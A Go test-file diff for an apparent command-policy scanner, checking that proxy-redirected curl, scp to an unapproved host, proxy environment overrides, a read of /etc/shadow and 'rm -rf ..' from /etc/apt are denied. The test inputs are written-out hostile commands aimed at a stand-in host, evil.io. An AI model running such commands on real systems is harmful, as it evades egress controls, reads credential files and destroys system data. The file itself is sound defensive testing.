@@ -1189,3 +1189,161 @@ func TestDangerousDeleteTraversalDeny(t *testing.T) {
 		t.Errorf("isRootOrSystem(/tmp/../etc) = false, want true")
 	}
 }
+
+// TestCurlAltProxyOptionsDeny covers curl's alternative proxy switches
+// (--socks4/--socks4a/--socks5/--socks5-hostname/--proxy1.0): the proxy value
+// is the real egress destination and must not ride a whitelisted request URL
+// past the whitelist, in both the equals and space forms.
+func TestCurlAltProxyOptionsDeny(t *testing.T) {
+	p := loadExamplePolicy(t) // allows github.com; on_non_whitelisted: deny
+	for _, cmd := range []string{
+		`curl --socks5-hostname=evil.io:1080 https://github.com/a`,
+		`curl --socks5-hostname evil.io:1080 https://github.com/a`,
+		`curl --socks5=evil.io:1080 https://github.com/a`,
+		`curl --socks5 evil.io:1080 https://github.com/a`,
+		`curl --socks4=evil.io:1080 https://github.com/a`,
+		`curl --socks4a evil.io:1080 https://github.com/a`,
+		`curl --proxy1.0=evil.io:8080 https://github.com/a`,
+		`curl --proxy1.0 evil.io:8080 https://github.com/a`,
+	} {
+		findings, decision := scanCmd(t, p, BackendWorkspace, cmd)
+		if decision != DecisionDeny {
+			t.Errorf("%q: decision = %q, want deny (findings: %+v)", cmd, decision, findings)
+		}
+		if !hasRule(findings, ruleNetworkID) {
+			t.Errorf("%q: missing R-NET-001: %+v", cmd, findings)
+		}
+	}
+}
+
+// TestScpLocalOperandsAreNotHosts pins scp's operand split: a dotted local
+// filename must not go through the dotted-domain heuristic and be denied as a
+// non-whitelisted "host"; only operands with remote syntax (a ':' before the
+// first path separator) contribute one.
+func TestScpLocalOperandsAreNotHosts(t *testing.T) {
+	// Upload: dotted local source, whitelisted remote destination.
+	hosts := extractHosts("scp", []string{"release.tar.gz", "user@github.com:/tmp/"})
+	if len(hosts) != 1 || hosts[0] != "github.com" {
+		t.Errorf("upload hosts = %v, want [github.com]", hosts)
+	}
+	// Download: whitelisted remote source, dotted local destination.
+	hosts = extractHosts("scp", []string{"user@github.com:/tmp/release.tar.gz", "local.copy.tar.gz"})
+	if len(hosts) != 1 || hosts[0] != "github.com" {
+		t.Errorf("download hosts = %v, want [github.com]", hosts)
+	}
+
+	// Scan level: DefaultPolicy has no command allow-list, so the network rule
+	// alone decides once scp is configured as a download command.
+	p := DefaultPolicy()
+	p.Network = NetworkPolicy{
+		DownloadCommands: []string{"scp"},
+		AllowedDomains:   []string{"github.com"},
+		OnNonWhitelisted: ActionDeny,
+	}
+	if err := p.compile(); err != nil {
+		t.Fatalf("compile: %v", err)
+	}
+	findings, decision := scanCmd(t, &p, BackendWorkspace,
+		`scp release.tar.gz user@github.com:/tmp/`)
+	if decision != DecisionAllow {
+		t.Errorf("upload decision = %q, want allow (findings: %+v)", decision, findings)
+	}
+	findings, decision = scanCmd(t, &p, BackendWorkspace,
+		`scp user@evil.io:/x local.file.txt`)
+	if decision != DecisionDeny || !hasRule(findings, ruleNetworkID) {
+		t.Errorf("non-whitelisted scp remote must deny, got %q: %+v", decision, findings)
+	}
+}
+
+// TestProxyEnvRedirectDeny pins that a proxy environment override on a
+// download command is whitelist-checked: HTTPS_PROXY=http://evil.io:8080 must
+// not tunnel a whitelisted curl through an unapproved relay, even when
+// env.allowed_keys is empty (which disables the opt-in R-ENV-001).
+func TestProxyEnvRedirectDeny(t *testing.T) {
+	p := loadExamplePolicy(t)
+	p.Env.AllowedKeys = nil
+
+	er := ExecRequest{
+		Command: `curl https://github.com/a`,
+		Env:     map[string]string{"HTTPS_PROXY": "http://evil.io:8080"},
+	}
+	findings, decision, _ := p.scan(er, BackendWorkspace)
+	if decision != DecisionDeny {
+		t.Errorf("decision = %q, want deny (findings: %+v)", decision, findings)
+	}
+	if !hasRule(findings, ruleNetworkID) {
+		t.Errorf("missing R-NET-001 for proxy env: %+v", findings)
+	}
+
+	// Lower-case spelling and ALL_PROXY count too.
+	er.Env = map[string]string{"all_proxy": "socks5://evil.io:1080"}
+	findings, decision, _ = p.scan(er, BackendWorkspace)
+	if decision != DecisionDeny || !hasRule(findings, ruleNetworkID) {
+		t.Errorf("all_proxy must deny, got %q: %+v", decision, findings)
+	}
+
+	// A whitelisted proxy destination still allows.
+	er.Env = map[string]string{"HTTPS_PROXY": "http://github.com:8080"}
+	findings, decision, _ = p.scan(er, BackendWorkspace)
+	if decision != DecisionAllow {
+		t.Errorf("whitelisted proxy should allow, got %q: %+v", decision, findings)
+	}
+
+	// A proxy env on a non-download command is not the network rule's business.
+	er = ExecRequest{
+		Command: "go build ./...",
+		Env:     map[string]string{"HTTPS_PROXY": "http://evil.io:8080"},
+	}
+	findings, _, _ = p.scan(er, BackendWorkspace)
+	if hasRule(findings, ruleNetworkID) {
+		t.Errorf("non-download command must not trip R-NET-001: %+v", findings)
+	}
+}
+
+// TestDefaultPolicyCodeNetworkNeutral pins that the built-in default policy —
+// documented as having no network whitelist — stays network-neutral on the
+// code backend: a benign URL in non-shell code must not be denied. An
+// explicitly configured whitelist still denies an outside domain
+// (TestCodeBlockBridgeAndURLs).
+func TestDefaultPolicyCodeNetworkNeutral(t *testing.T) {
+	p := DefaultPolicy()
+	if err := p.compile(); err != nil {
+		t.Fatalf("compile: %v", err)
+	}
+	findings, decision := scanCode(t, &p, []CodeBlock{{
+		Language: "python",
+		Code:     `print("https://example.com")`,
+	}})
+	if decision != DecisionAllow {
+		t.Errorf("decision = %q, want allow (findings: %+v)", decision, findings)
+	}
+	if hasRule(findings, ruleNetworkID) {
+		t.Errorf("default policy must not run the code URL whitelist: %+v", findings)
+	}
+}
+
+// TestCwdRelativeBareOperands pins cwd resolution for bare operands: a
+// forbidden path reached via a bare cwd-relative word and a destructive rm
+// target that only resolves to a system directory through cwd are both
+// recognized.
+func TestCwdRelativeBareOperands(t *testing.T) {
+	p := loadExamplePolicy(t)
+
+	// "cat shadow" run from /etc names /etc/shadow.
+	findings, decision, _ := p.scan(
+		ExecRequest{Command: "cat shadow", Cwd: "/etc"}, BackendWorkspace)
+	if decision != DecisionDeny || !hasRule(findings, ruleCredID) {
+		t.Errorf("bare cwd-relative forbidden path must deny, got %q: %+v", decision, findings)
+	}
+
+	// "rm -rf .." run from /etc/apt deletes /etc: the resolved target makes it
+	// critical, not merely the high of a recursive+force delete.
+	findings, decision, risk := p.scan(
+		ExecRequest{Command: "rm -rf ..", Cwd: "/etc/apt"}, BackendWorkspace)
+	if decision != DecisionDeny || !hasRule(findings, ruleDangerousID) {
+		t.Errorf("rm -rf .. from /etc/apt must deny, got %q: %+v", decision, findings)
+	}
+	if risk != RiskCritical {
+		t.Errorf("risk = %q, want critical (system dir via cwd): %+v", risk, findings)
+	}
+}
